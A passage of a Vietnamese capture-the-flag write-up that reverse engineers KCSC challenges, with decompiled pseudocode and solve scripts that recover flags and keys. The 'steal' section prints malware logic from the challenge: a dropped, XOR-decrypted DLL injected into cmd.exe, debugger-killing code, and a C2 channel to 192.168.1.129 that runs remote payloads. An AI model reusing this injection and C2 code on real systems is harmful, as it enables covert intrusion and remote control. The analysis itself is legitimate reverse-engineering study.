  v23 = 0x77;
  do
  {
    *(_BYTE *)v5 ^= 0x77u;                      // CryptAcquireContextA
    v5 = (int *)((char *)v5 + 1);
    --v6;
  }
  while ( v6 );
  procAddr_CryptAcquireContextA = v2(v4, v22);
  v7 = 0x10;
  v28[0] = 0x70E0534;
  v8 = v28;
  v28[1] = 0x12053403;
  v28[2] = 0x3F120316;
  v28[3] = 0x771F0416;
  do
  {
    *(_BYTE *)v8 ^= 0x77u;                      // CryptCreateHash
    v8 = (int *)((char *)v8 + 1);
    --v7;
  }
  while ( v7 );
  procAddr_CryptCreateHash = v2(v4, v28);
  v9 = 0xE;
  v32[0] = 0x70E0534;
  v10 = v32;
  v32[1] = 0x4163F03;
  v32[2] = 0x316331F;
  v33 = 0x7716;
  do
  {
    *(_BYTE *)v10 ^= 0x77u;                     // CryptHashData
    v10 = (int *)((char *)v10 + 1);
    --v9;
  }
  while ( v9 );
  procAddr_CryptHashData = v2(v4, v32);
  v11 = 0xF;
  v29[0] = 0x70E0534;
  v12 = v29;
  v29[1] = 0x5123303;
  v29[2] = 0x3C12011E;
  v30 = 0xE12;
  v31 = 0x77;
  do
  {
    *(_BYTE *)v12 ^= 0x77u;                     // CryptDeriveKey
    v12 = (int *)((char *)v12 + 1);
    --v11;
  }
  while ( v11 );
  procAddr_CryptDeriveKey = v2(v4, v29);
  v13 = 0x11;
  v25[0] = 0x70E0534;
  v14 = v25;
  v25[1] = 0x4123303;
  v25[2] = 0xE180503;
  v25[3] = 0x1F04163F;
  v26 = 0x77;
  do
  {
    *(_BYTE *)v14 ^= 0x77u;                     // CryptDestroyHash
    v14 = (int *)((char *)v14 + 1);
    --v13;
  }
  while ( v13 );
  procAddr_CryptDestroyHash = v2(v4, v25);
  v15 = 0xD;
  v34[0] = 0x70E0534;
  v16 = v34;
  v34[1] = 0x14193203;
  v34[2] = 0x3070E05;
  v35 = 0x77;
  do
  {
    *(_BYTE *)v16 ^= 0x77u;                     // CryptEncrypt
    v16 = (int *)((char *)v16 + 1);
    --v15;
  }
  while ( v15 );
  procAddr_CryptEncrypt = v2(v4, v34);
  v17 = 0x10;
  v27[0] = 0x70E0534;
  v18 = v27;
  v27[1] = 0x4123303;
  v27[2] = 0xE180503;
  v27[3] = 0x770E123C;
  do
  {
    *(_BYTE *)v18 ^= 0x77u;                     // CryptDestroyKey
    v18 = (int *)((char *)v18 + 1);
    --v17;
  }
  while ( v17 );
  procAddr_CryptDestroyKey = v2(v4, v27);
  v19 = 0x14;
  v24[0] = 0x70E0534;
  v20 = v24;
  v24[1] = 0x1B122503;
  v24[2] = 0x12041612;
  v24[3] = 0x3191834;
  v24[4] = 0x77030F12;
  do
  {
    *(_BYTE *)v20 ^= 0x77u;                     // CryptReleaseContext
    v20 = (int *)((char *)v20 + 1);
    --v19;
  }
  while ( v19 );
  result = v2(v4, v24);
  procAddr_CryptReleaseContext = result;
  return result;
}
```
- Hàm này có nhiệm vụ load dll `Advapi32.dll` resolve ra các hàm `Wincrypt` (Có thể liên quan đến mã hóa flag)

- Hàm `sub_871040`
```C
int sub_871040()
{
  int result; // eax

  if ( (char *)dword_874404 == "YXV0aG9ybm9vYm1hbm5uZnJvbWtjc2M=" )
    return procAddr_SetUnhandledExceptionFilter(sub_8718D0);
  return result;
}
```
- Hàm này thực hiện check giá trị của `dword_874404` với string được gán trong trường hợp không có debugger, sau đó gắn hàm xử lí ngoại lệ là hàm `sub_8718D0` bằng hàm `SetUnhandledExceptionFilter`. Theo [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter), hàm `SetUnhandledExceptionFilter` sẽ có nhiệm vụ chuyển luồng xử lí ngoại lệ sang hàm được chỉ định trong `lpTopLevelExceptionFilter` trong trường hợp này sẽ là `sub_8718D0`
- Nếu ta quay lại hàm `main` thì có thể thấy rằng nếu như ta chạy vào đó thì ngay lập tức xảy ra ngoại lệ như sau

![image](https://github.com/user-attachments/assets/18f7d344-631f-4cf8-b8d4-a0dfdb643b0e)

- Vậy có thể thấy rằng sau khi chạy vào hàm `main` thì luồng thực thi lúc này sẽ được chuyển vào `sub_8718D0`, và đây chính là hàm thực thi chuẩn của chúng ta

- Hàm `sub_8718D0`
```C
int __stdcall sub_FC18D0(_DWORD **a1)
{
  char *v1; // eax
  int v2; // ecx
  char *v3; // eax
  int v4; // ecx
  CHAR *v5; // eax
  int v6; // ecx
  __int16 *v7; // eax
  int v8; // ecx
  CHAR *v9; // eax
  int v10; // ecx
  __int16 v12; // [esp+0h] [ebp-90h] BYREF
  char v13[2]; // [esp+4h] [ebp-8Ch] BYREF
  char v14; // [esp+6h] [ebp-8Ah]
  char Source[52]; // [esp+8h] [ebp-88h] BYREF
  char Destination[52]; // [esp+3Ch] [ebp-54h] BYREF
  char Format[4]; // [esp+70h] [ebp-20h] BYREF
  int v18; // [esp+74h] [ebp-1Ch]
  int v19; // [esp+78h] [ebp-18h]
  int v20; // [esp+7Ch] [ebp-14h]
  __int16 v21; // [esp+80h] [ebp-10h]
  CHAR Caption[4]; // [esp+84h] [ebp-Ch] BYREF
  int v23; // [esp+88h] [ebp-8h]

  if ( **a1 == 0xC0000096 )
  {
    *(_DWORD *)Format = 0xCEDFC5EE;
    v1 = Format;
    v18 = 0xC4F88BD9;
    v2 = 0x12;
    v19 = 0xC3DFCEC6;
    v20 = 0x91CCC5C2;
    v21 = 0xAB8B;
    do
    {
      *v1++ ^= 0xABu;
      --v2;
    }
    while ( v2 );
    printf(Format, v12);
    *(_WORD *)v13 = 0xBEE8;
    v14 = 0xCD;
    v3 = v13;
    v4 = 3;
    do
    {
      *v3++ ^= 0xCDu;
      --v4;
    }
    while ( v4 );
    scanf(v13, (char)Source);
    if ( (unsigned __int8)sub_FC1D20(Source) )
    {
      *(_DWORD *)Caption = 0xACBCACA4;
      v5 = Caption;
      LOBYTE(v23) = 0x94;
      v6 = 5;
      do
      {
        *v5++ ^= 0xEFu;
        --v6;
      }
      while ( v6 );
      memset(Destination, 0, 0x32u);
      *(_DWORD *)Destination = *(_DWORD *)Caption;
      Destination[4] = v23;
      strcat_s(Destination, 0x32u, Source);
      v12 = 0xA5F5;
      v7 = &v12;
      v8 = 2;
      do
      {
        *(_BYTE *)v7 ^= 0x88u;
        v7 = (__int16 *)((char *)v7 + 1);
        --v8;
      }
      while ( v8 );
      *(_DWORD *)Caption = 0xBDBBB6BC;
      v23 = 0xFADBDBDB;
      Destination[HIBYTE(v12)] = v12;
      v9 = Caption;
      v10 = 8;
      do
      {
        *v9++ ^= 0xFAu;
        --v10;
      }
      while ( v10 );
      MessageBoxA(0, Destination, Caption, 0x40u);
    }
    else
    {
      `init_cat_laugh`();
    }
  }
  return 1;
}
```
- Hàm này có nhiệm vụ nhận input của user, sau đó biến đổi thông qua hàm `sub_FC1D20`, nếu input đúng thì chương trình hiện MessageBox thông báo, ngược lại thì sẽ gọi hàm `init_cat_laugh` để tiến hành troll user
- Hàm `sub_FC1D20`
```C
char __thiscall sub_FC1D20(const char *this)
{
  int (__stdcall *v1)(int, MACRO_CALG, _DWORD, _DWORD, int *); // edi
  void (__stdcall *v2)(int); // esi
  void (__stdcall *v3)(int, _DWORD); // ebx
  int *v4; // eax
  int v5; // ecx
  int v6; // eax
  size_t v7; // esi
  void *v8; // edi
  int v9; // ecx
  int v10; // edi
  int v12; // [esp-4h] [ebp-64h]
  int (__stdcall *v13)(int, _DWORD, int, _DWORD, void *, size_t *, size_t); // [esp+Ch] [ebp-54h]
  int (__stdcall *v15)(int, MACRO_CALG, int, _DWORD, int *); // [esp+14h] [ebp-4Ch]
  int (__stdcall *v16)(int, int *, int, _DWORD); // [esp+18h] [ebp-48h]
  void (__stdcall *v17)(int); // [esp+1Ch] [ebp-44h]
  size_t Size; // [esp+20h] [ebp-40h] BYREF
  int v19; // [esp+24h] [ebp-3Ch] BYREF
  int v20; // [esp+28h] [ebp-38h] BYREF
  int v21; // [esp+2Ch] [ebp-34h] BYREF
  int v22[10]; // [esp+30h] [ebp-30h] BYREF
  __int16 v23; // [esp+58h] [ebp-8h]
  char v24; // [esp+5Ah] [ebp-6h]

  Size = strlen(this);
  if ( Size != 0x28 )
    return 0;
  v1 = (int (__stdcall *)(int, MACRO_CALG, _DWORD, _DWORD, int *))procAddr_CryptCreateHash;
  v2 = (void (__stdcall *)(int))procAddr_CryptDestroyHash;
  v3 = (void (__stdcall *)(int, _DWORD))procAddr_CryptReleaseContext;
  v16 = (int (__stdcall *)(int, int *, int, _DWORD))procAddr_CryptHashData;
  v15 = (int (__stdcall *)(int, MACRO_CALG, int, _DWORD, int *))procAddr_CryptDeriveKey;
  v13 = (int (__stdcall *)(int, _DWORD, int, _DWORD, void *, size_t *, size_t))procAddr_CryptEncrypt;
  v17 = (void (__stdcall *)(int))procAddr_CryptDestroyKey;
  if ( !procAddr_CryptAcquireContextA(&v21, 0, 0, 1, 0) )
    return 0;
  if ( v1(v21, CALG_SHA1, 0, 0, &v20) )
  {
    v22[0] = 0xDEDADAC6;
    v4 = v22;
    v22[1] = 0x818194DD;
    v5 = 0x2B;
    v22[2] = 0x80D9D9D9;
    v22[3] = 0xDADBC1D7;
    v22[4] = 0x80CBCCDB;
    v22[5] = 0x81C3C1CD;
    v22[6] = 0xCDDACFD9;
    v22[7] = 0x93D891C6;
    v22[8] = 0x9AD9FFCA;
    v22[9] = 0xC9F997D9;
    v23 = 0xCDF6;
    v24 = 0xFF;
    do
    {
      *(_BYTE *)v4 ^= 0xAEu;                    // https://www.youtube.com/watch?v=dQw4w9WgXcQ
      v4 = (int *)((char *)v4 + 1);
      --v5;
    }
    while ( v5 );
    if ( v16(v20, v22, 0x2B, 0) )
    {
      v6 = v15(v21, CALG_RC4, v20, 0, &v19);
      v12 = v20;
      if ( v6 )
      {
        v2(v20);
        v7 = Size + 1;
        v8 = malloc(Size + 1);
        memcpy(v8, this, Size);
        *((_BYTE *)v8 + Size) = 0;
        if ( v13(v19, 0, 1, 0, v8, &Size, v7) )
        {
          v9 = 0;
          v10 = (_BYTE *)v8 - byte_FC31F8;
          while ( byte_FC31F8[v10 + v9] == byte_FC31F8[v9] )
          {
            if ( ++v9 >= 0x28 )
            {
              v17(v19);
              v3(v21, 0);
              return 1;
            }
          }
        }
        v17(v19);
        goto LABEL_16;
      }
    }
    else
    {
      v12 = v20;
    }
    v2(v12);
  }
LABEL_16:
  v3(v21, 0);
  return 0;
}
```
- Hàm này sẽ có nhiệm vụ mã hóa input của user bằng thuật toán `SHA1` với key là link yt `Rick Roll`, cuối cùng thì kiểm tra với `byte_FC31F8`. Với những dữ kiện như này, ta có thể viết script giải như sau
## Script and Flag
```C
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "Advapi32.lib")

#define KEY_LENGTH 16 // 128-bit key length

void HandleError(const char* errorMessage) {
    printf("Error: %s (code: %lu)\n", errorMessage, GetLastError());
    exit(1);
}

int main() {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    BYTE key[KEY_LENGTH];
    BYTE ciphertext[] = {
0xE7, 0x7B, 0xFA, 0xF3, 0xF0, 0x7F, 0x0E, 0xD6, 0x37, 0x2B,
0xBE, 0xCB, 0xF7, 0x61, 0xF1, 0xDC, 0xF4, 0x45, 0xBC, 0xA5,
0x0B, 0x81, 0x5D, 0xD1, 0x65, 0x4A, 0x5F, 0xAE, 0x59, 0x3B,
0x0B, 0xCB, 0xCC, 0x17, 0x9B, 0x7E, 0x55, 0xA0, 0x18, 0xB5
    };
    DWORD plaintextLen = sizeof(ciphertext);

    // Example ciphertext in hexadecimal 

    DWORD ciphertextLen = sizeof(ciphertext);

    // Define the input string (URL)
    const char* inputString = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    // Acquire a cryptographic provider context
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        HandleError("Failed to acquire cryptographic context");
    }

    // Create a SHA-1 hash object
    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
        HandleError("Failed to create hash object");
    }

    // Hash the input string
    if (!CryptHashData(hHash, (BYTE*)inputString, strlen(inputString), 0)) {
        HandleError("Failed to hash data");
    }

    // Derive the RC4 key from the hash
    if (!CryptDeriveKey(hProv, CALG_RC4, hHash, 0, &hKey)) {
        HandleError("Failed to derive key");
    }

    // Encrypt the plaintext
    if (!CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)ciphertext, &ciphertextLen)) {
        HandleError("Failed to encrypt data");
    }


    for (DWORD i = 0; i < plaintextLen; i++) {
        printf("%c", ciphertext[i]);
    }
    printf("\n");

    // Cleanup
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);

    return 0;
}
```
**Flag:** `KCSC{The_m1xture_mak3_hard_challenge_4_y0u!!!}`
# steal
## Mics
- Đề cho 1 file PE64 và 1 file pcapng

![image](https://github.com/user-attachments/assets/424a862e-ef54-42aa-88f3-73a791a96b5d)

## Detailed Analysis
- Với những bài hard, thì khả năng cao sẽ có anti debug, như một thói quen thì mình sẽ check cửa sổ `exports` để check có hàm `TlsCallBack` hay không. Và như dự đoán, linh cảm của mình đã đúng

- Hàm `TlsCallback_0` (mình sẽ để asm thay vì pseudocode vì instruction `DebugBreak` làm ảnh hưởng tới pseudocode được gen ra)

![image](https://github.com/user-attachments/assets/a18922e2-6abb-4aa1-bc5b-5c9347651753)

- Ta có thể thấy rằng hàm này thực hiện anti debug bằng cách gọi hàm `IsDebuggerPresent` và `DebugBreak` (Software Breakpoint để khi debugger step qua instruction này thì sẽ raise exception), luồng chuẩn của chúng ta sẽ là 2 hàm được gọi bên dưới kia

- Hàm `sub_7FF638FF1250`
```C
int sub_7FF638FF1250()
{
  HRSRC ResourceW; // rax
  signed int v1; // edx
  __int64 v2; // rcx
  __m128 v3; // xmm0
  __m128 v4; // xmm1
  __int64 v5; // rax
  HMODULE ModuleHandleW; // rdi
  HRSRC v7; // rsi
  size_t v8; // rbx
  HRSRC v9; // r14
  char *v10; // rdi
  unsigned int v11; // r9d
  char *v12; // rcx
  __int64 v13; // rax
  __int128 v15; // [rsp+10h] [rbp-F0h]
  FILE *Stream; // [rsp+20h] [rbp-E0h] BYREF
  DWORD Stream_8; // [rsp+28h] [rbp-D8h] BYREF
  char Format[16]; // [rsp+30h] [rbp-D0h] BYREF
  int v19; // [rsp+40h] [rbp-C0h]
  int v20; // [rsp+44h] [rbp-BCh]
  int v21; // [rsp+48h] [rbp-B8h]
  int v22; // [rsp+4Ch] [rbp-B4h]
  int v23; // [rsp+50h] [rbp-B0h]
  int v24; // [rsp+54h] [rbp-ACh]
  char Buffer[256]; // [rsp+60h] [rbp-A0h] BYREF

  *(_DWORD *)Format = 0x5A8D39D3;
  *(_DWORD *)&Format[4] = 0x9D5DB16E;
  *(_DWORD *)&Format[8] = 0x65FC17D7;
  *(_DWORD *)&Format[0xC] = 0xB97C17DA;
  v19 = 0x4B8F2CC8;
  v20 = 0x3598DA68;
  v21 = 0xF882F503;
  v22 = 0x8CC789FB;
  v23 = 0x9D8E9FA3;
  v24 = 0xD04829;
  Stream_8 = 0x100;
  LODWORD(ResourceW) = GetUserNameA(Buffer, &Stream_8);
  if ( (_DWORD)ResourceW )
  {
    v1 = 0;
    v2 = 0i64;
    do
    {
      v3 = (__m128)_mm_loadu_si128((const __m128i *)&Format[v2]);
      v1 += 0x20;
      v4 = (__m128)_mm_loadu_si128((const __m128i *)&byte_7FF638FF34C0[v2]);
      v5 = v1;
      v2 += 0x20i64;                            // Temp dir being generated here
      *(__int128 *)((char *)&v15 + v2) = (__int128)_mm_xor_ps(v4, v3);
      *(__m128 *)((char *)&Stream + v2) = _mm_xor_ps(
                                            (__m128)_mm_loadu_si128((const __m128i *)&cp[v2]),
                                            (__m128)_mm_loadu_si128((const __m128i *)((char *)&Stream + v2)));
    }
    while ( (unsigned __int64)v1 < 0x20 );
    if ( (unsigned __int64)v1 < 0x28 )
    {
      do
      {
        ++v1;
        Format[v5] ^= byte_7FF638FF34C0[v5];    // Evil.dll
        ++v5;
      }
      while ( (unsigned int)v1 < 0x28 );
    }
    sub_7FF638FF1010(FileName, 0x104ui64, Format);
    ModuleHandleW = GetModuleHandleW(0i64);
    ResourceW = FindResourceW(ModuleHandleW, (LPCWSTR)0x65, L"BIN");
    v7 = ResourceW;
    if ( ResourceW )
    {
      LODWORD(ResourceW) = SizeofResource(ModuleHandleW, ResourceW);
      v8 = (unsigned int)ResourceW;
      if ( (_DWORD)ResourceW )
      {
        ResourceW = (HRSRC)LoadResource(ModuleHandleW, v7);
        if ( ResourceW )
        {
          ResourceW = (HRSRC)LockResource(ResourceW);
          v9 = ResourceW;
          if ( ResourceW )
          {
            v10 = (char *)operator new((unsigned int)v8);
            memcpy(v10, v9, (unsigned int)v8);
            v11 = 0;
            if ( (_DWORD)v8 )
            {
              v12 = v10;
              do
              {
                ++v12;
                v13 = v11++ & 0x1F;
                v12[0xFFFFFFFF] ^= byte_7FF638FF34C0[v13 + 0x28];// Decrypt resource (PE File)
              }
              while ( v11 < (unsigned int)v8 );
            }
            Stream = 0i64;
            LODWORD(ResourceW) = fopen_s(&Stream, FileName, "wb");
            if ( Stream )
            {
              fwrite(v10, 1ui64, v8, Stream);
              LODWORD(ResourceW) = fclose(Stream);
            }
          }
        }
      }
    }
  }
  return (int)ResourceW;
}
```
- Hàm này có nhiệm vụ lấy địa chỉ của thư mục `Temp` trên thiết bị của user, sau đó load resource có sẵn trong binary và tiến hành dùng xor để decrypt resource này thành 1 dll (PE File)

- Hàm `sub_7FF638FF1070`
```C
int sub_7FF638FF1070()
{
  HMODULE ModuleHandleW; // rax
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // rsi
  HANDLE Toolhelp32Snapshot; // rbx
  __int64 v3; // rax
  char v4; // cl
  DWORD th32ProcessID; // r8d
  HANDLE RemoteThread; // rax
  void *v7; // rbx
  void *v8; // rdi
  void *v9; // rdi
  size_t PtNumOfCharConverted[2]; // [rsp+40h] [rbp-378h] BYREF
  PROCESSENTRY32W pe; // [rsp+50h] [rbp-368h] BYREF
  char Dst[272]; // [rsp+290h] [rbp-128h] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(ModuleHandleW, "LoadLibraryA");
  pe.dwSize = 0x238;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      PtNumOfCharConverted[0] = 0i64;
      wcstombs_s(PtNumOfCharConverted, Dst, 0x104ui64, pe.szExeFile, 0xFFFFFFFFFFFFFFFFui64);
      v3 = 0i64;
      while ( 1 )
      {
        v4 = Dst[v3++];
        if ( v4 != aCmdExe[v3 - 1] )
          break;
        if ( v3 == 8 )
        {
          th32ProcessID = pe.th32ProcessID;
          goto LABEL_8;
        }
      }
    }
    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
  }
  CloseHandle(Toolhelp32Snapshot);
  th32ProcessID = 0;
LABEL_8:
  RemoteThread = OpenProcess(0x43Au, 0, th32ProcessID);
  v7 = RemoteThread;
  if ( RemoteThread )
  {
    RemoteThread = VirtualAllocEx(RemoteThread, 0i64, 0x104ui64, 0x3000u, 0x40u);
    v8 = RemoteThread;
    if ( RemoteThread )
    {
      LODWORD(RemoteThread) = WriteProcessMemory(v7, RemoteThread, FileName, 0x104ui64, 0i64);
      if ( (_DWORD)RemoteThread )
      {
        RemoteThread = CreateRemoteThread(v7, 0i64, 0i64, (LPTHREAD_START_ROUTINE)LoadLibraryA, v8, 0, 0i64);
        v9 = RemoteThread;
        if ( RemoteThread )
        {
          WaitForSingleObject(RemoteThread, 0xFFFFFFFF);
          CloseHandle(v7);
          CloseHandle(v9);
          remove(FileName);
          ExitProcess(0);
        }
      }
    }
  }
  return (int)RemoteThread;
}
```
- Hàm này sẽ tiến hành enumerate snapshot để tìm tiến trình `cmd.exe`, sau đó sử dụng kĩ thuật `DLL Injection` để inject dll đã được đề cập ở trên vào trong process này, sau khi process này thực thi xong thì file dll này sẽ bị xóa đi

- Quay trở lại hàm `main` phân tích
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  SOCKET v3; // rsi
  unsigned int v4; // eax
  unsigned int v5; // ebx
  char *v6; // rdi
  char *v7; // rdx
  int v8; // r8d
  int v9; // eax
  __int64 v10; // rdx
  __int64 v11; // rcx
  int v12; // ebx
  struct sockaddr name; // [rsp+20h] [rbp-5F8h] BYREF
  struct WSAData WSAData; // [rsp+30h] [rbp-5E8h] BYREF
  char buf[48]; // [rsp+1D0h] [rbp-448h] BYREF
  char v17[1024]; // [rsp+200h] [rbp-418h] BYREF

  if ( !WSAStartup(0x202u, &WSAData) )
  {
    v3 = socket(2, 1, 0);
    if ( v3 != 0xFFFFFFFFFFFFFFFFui64 )
    {
      name.sa_family = 2;
      *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.1.129");
      *(_WORD *)name.sa_data = htons(13337u);
      if ( connect(v3, &name, 0x10) != 0xFFFFFFFF )
      {
        v4 = time64(0i64);
        srand(v4);
        v5 = 0;
        v6 = buf;
        do
        {
          ++v5;
          *v6++ = rand();
        }
        while ( v5 < 0x30 );
        v7 = buf;
        v8 = 0x30;
LABEL_7:
        send(v3, v7, v8, 0);
        do
        {
          v9 = recv(v3, v17, 0x400, 0);
          v12 = v9;
          if ( v9 > 0 )
          {
            if ( (unsigned __int64)v9 >= 0x400 )
              sub_7FF638FF19D8(v11, v10, v9);
            v17[v9] = 0;
            sub_7FF638FF1500((__int64)buf, v17, v9);
            v8 = v12;
            v7 = v17;
            goto LABEL_7;
          }
        }
        while ( v9 );
        closesocket(v3);
        WSACleanup();
      }
    }
  }
  return 1;
}
```
- Hàm này thực hiện kết nối đến `192.168.1.129` với port là `13337`, tiếp đến là gọi `srand` và `rand` và gửi chỗ data được gen đó đi, sau đó nhận data từ phía C2, đưa chỗ data đó vào hàm `sub_7FF638FF1500` (RC4 Encrypt/Decrypt) để xử lý

- Bây giờ ta sẽ chuyển sang phân tích file `Evil.dll`

![image](https://github.com/user-attachments/assets/4bb3495b-a497-4f76-a36f-c3d57d167865)

- Tại hàm `sub_180001950` có tạo ra một thread chạy 1 routine rất khả nghi

```C
__int64 __fastcall sub_180001950(__int64 a1, int a2)
{
  if ( a2 == 1 )
    CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, 0i64, 0, 0i64);
  return 1i64;
}
```
- Hàm `StartAddress`
```C
DWORD __fastcall StartAddress(LPVOID lpThreadParameter)
{
  HANDLE Toolhelp32Snapshot; // rdi
  unsigned int v2; // esi
  char *v3; // r9
  HANDLE v4; // rax
  void *v5; // rbx
  DWORD CurrentProcessId; // eax
  HANDLE v7; // rax
  void *v8; // rbx
  SOCKET v9; // rax
  SOCKET v10; // rdi
  UCHAR *v11; // rbx
  int v12; // eax
  int v13; // eax
  size_t PtNumOfCharConverted; // [rsp+30h] [rbp-D0h] BYREF
  struct sockaddr name; // [rsp+38h] [rbp-C8h] BYREF
  PROCESSENTRY32W pe; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v18[8]; // [rsp+290h] [rbp+190h] BYREF
  char v19[32]; // [rsp+2D0h] [rbp+1D0h] BYREF
  UCHAR pbSecret[48]; // [rsp+2F0h] [rbp+1F0h] BYREF
  char Dst[272]; // [rsp+320h] [rbp+220h] BYREF
  char v22[1024]; // [rsp+430h] [rbp+330h] BYREF
  char buf[1024]; // [rsp+830h] [rbp+730h] BYREF

  pe.dwSize = 568;
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v2 = 0;
  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      PtNumOfCharConverted = 0i64;
      wcstombs_s(&PtNumOfCharConverted, Dst, 0x104ui64, pe.szExeFile, 0xFFFFFFFFFFFFFFFFui64);
      v18[0] = (__int64)"ollydbg.exe";
      v18[5] = (__int64)"windbg.exe";
      v3 = (char *)v18;
      v18[1] = (__int64)"x64dbg.exe";
      v18[6] = (__int64)"dbgview.exe";
      v18[7] = (__int64)"immunitydbg.exe";
      v18[2] = (__int64)"idaq.exe";
      v18[3] = (__int64)"ida64.exe";
      v18[4] = (__int64)"ida.exe";
      while ( strcmp(Dst, *(const char **)v3) )
      {
        v3 += 8;
        if ( v3 == v19 )
          goto LABEL_10;
      }
      v4 = OpenProcess(1u, 0, pe.th32ProcessID);
      v5 = v4;
      if ( v4 )
      {
        TerminateProcess(v4, 1u);
        CloseHandle(v5);
      }
      CurrentProcessId = GetCurrentProcessId();
      v7 = OpenProcess(1u, 0, CurrentProcessId);
      v8 = v7;
      if ( v7 )
      {
        TerminateProcess(v7, 1u);
        CloseHandle(v8);
      }
LABEL_10:
      ;
    }
    while ( Process32NextW(Toolhelp32Snapshot, &pe) );
  }
  CloseHandle(Toolhelp32Snapshot);
  LODWORD(v9) = WSAStartup(0x202u, (LPWSADATA)&pe);
  if ( !(_DWORD)v9 )
  {
    v9 = socket(2, 1, 0);
    v10 = v9;
    if ( v9 != -1i64 )
    {
      name.sa_family = 2;
      *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.1.129");
      *(_WORD *)name.sa_data = htons(0x3419u);
      LODWORD(v9) = connect(v10, &name, 16);
      if ( (_DWORD)v9 != -1 )
      {
        LODWORD(PtNumOfCharConverted) = time64(0i64);
        srand(PtNumOfCharConverted);
        v11 = pbSecret;
        do
        {
          ++v2;
          *v11++ = rand();
        }
        while ( v2 < 0x30 );
        send(v10, (const char *)&PtNumOfCharConverted, 4, 0);
        v12 = recv(v10, buf, 1024, 0);
        sub_180001200(pbSecret, (PUCHAR)buf, v12, v19);
        do
        {
          while ( 1 )
          {
            v13 = recv(v10, v22, 1024, 0);
            if ( v13 <= 0 )
              break;
            if ( (unsigned __int64)v13 >= 0x400 )
              sub_180001AC8();
            v22[v13] = 0;
            sub_180001000(v19, v22);
            sub_180001460(v10, v22, v19);
          }
        }
        while ( v13 );
        closesocket(v10);
        LODWORD(v9) = WSACleanup();
      }
    }
  }
  return v9;
}
```
- Hàm này sẽ kiểm tra tên tiến trình đang chạy nó, nếu như tên của chúng là các disassembler hay debugger cơ bản như IDA, x64dbg,...etc thì chương trình sẽ tắt tiến trình đó, tiếp đến ta có thể thấy rằng chức năng của hàm này cũng tương tự như hàm `main` ở bên trên, thêm hàm `sub_180001200` thực hiện mã hóa AES với mode là CBC và hàm `sub_180001460` thực hiện chạy remote payload và mã hóa output bằng RC4. Vậy biết thuật toán mã hóa, những thứ ta cần phải tìm sẽ là như sau
	+ Thứ nhất sẽ là key,iv và cyphertext cho AES
 	+ Thứ 2 sẽ là key cho RC4


![image](https://github.com/user-attachments/assets/aa917f37-1c55-48f5-a12b-f191a340b66c)

- Bài cũng cho ta 1 file pcapng để ta có thể kiểm tra tcp stream giữa 2 tiến trình exe và dll, với dữ kiện là dll sẽ gửi data đi đầu tiên, ta có thể suy ra rằng đây sẽ là seed để khởi tạo ra key và iv cho quá trình mã hóa. Ta có thể dễ dàng mô phỏng lại với script như bên dưới


```C
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
int main(){
    unsigned int seed = 0x674f4b38; 
    srand(seed);
    for(int i=0; i<48; i++){
        int key_iv = rand() & 0xFF;
        printf("0x%X, ", key_iv);     
    }
    return 0;
}
```
- Sau đó thì là response có số byte là 32 (bội của 16), nên ta có thể phỏng đoán rằng đây sẽ là cyphertext cho AES, với các dữ kiện trên, mình có viết 1 script decrypt

```C
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

int EncryptData(PUCHAR pbSecret, PUCHAR pbInput, ULONG cbInput, void* outputBuffer, ULONG* outputSize) {
    BCRYPT_ALG_HANDLE phAlgorithm = NULL;
    BCRYPT_KEY_HANDLE phKey = NULL;
    ULONG cbOutput = 0, pcbResult = 0;
    UCHAR pbOutput[4] = { 0 };
    UCHAR* keyObject = NULL;
    void* encryptedData = NULL;
    int status = -1;

    // Open AES algorithm provider
    if (BCryptOpenAlgorithmProvider(&phAlgorithm, L"AES", NULL, 0) != 0) {
        fprintf(stderr, "Failed to open algorithm provider\n");
        return -1;
    }

    // Get the size of the key object
    if (BCryptGetProperty(phAlgorithm, L"ObjectLength", pbOutput, sizeof(pbOutput), &pcbResult, 0) != 0) {
        fprintf(stderr, "Failed to get key object size\n");
        goto cleanup;
    }

    ULONG keyObjectSize = *(ULONG*)pbOutput;

    // Allocate memory for the key object
    keyObject = (UCHAR*)HeapAlloc(GetProcessHeap(), 0, keyObjectSize);
    if (!keyObject) {
        fprintf(stderr, "Failed to allocate memory for key object\n");
        goto cleanup;
    }

    // Generate symmetric key
    if (BCryptGenerateSymmetricKey(phAlgorithm, &phKey, keyObject, keyObjectSize, pbSecret, 32, 0) != 0) {
        fprintf(stderr, "Failed to generate symmetric key\n");
        goto cleanup;
    }

    PUCHAR pbIV = pbSecret + 32; // Initialization vector (16 bytes)

    // Determine the size of the encrypted data
    if (BCryptDecrypt(phKey, pbInput, cbInput, NULL, pbIV, 16, NULL, 0, &cbOutput, 0) != 0) {
        fprintf(stderr, "Failed to get encrypted data size\n");
        goto cleanup;
    }

    // Allocate memory for the encrypted data
    encryptedData = HeapAlloc(GetProcessHeap(), 0, cbOutput);
    if (!encryptedData) {
        fprintf(stderr, "Failed to allocate memory for encrypted data\n");
        goto cleanup;
    }

    // Perform the encryption
